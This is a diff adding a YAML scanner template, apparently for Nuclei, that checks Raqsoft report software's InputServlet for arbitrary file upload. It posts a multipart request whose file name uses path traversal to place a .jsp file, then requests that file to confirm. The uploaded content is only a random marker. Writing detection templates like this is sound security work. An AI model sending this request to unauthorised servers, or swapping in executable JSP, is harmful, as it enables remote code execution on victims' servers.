@@ -1,0 +1,57 @@
+id: poc-yaml-raqsoft-inputservlet-anyfile-upload
+info:
+  name: 润乾报表 InputServlet 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+  description: |
+    润乾报表 InputServlet 存在任意文件上传漏洞，攻击者可以通过构造恶意请求上传恶意文件。
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload-check
+    method: POST
+    path:
+      - "{{BaseURL}}/InputServlet?action=12"
+    headers:
+      Content-Type: multipart/form-data; boundary=--------------------------170005680039721412137562
+    body: |-
+      ----------------------------170005680039721412137562
+      Content-Disposition: form-data; name="upsize"
+
+      1024
+      ----------------------------170005680039721412137562
+      Content-Disposition: form-data; name="file"; filename="/\.\..\\..\\..\\{{t1}}.jsp"
+      Content-Type: image/png
+
+      {{t2}}
+      ----------------------------170005680039721412137562--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "parent._uploadFileSuccess"
+
+  - id: file-verification-check
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
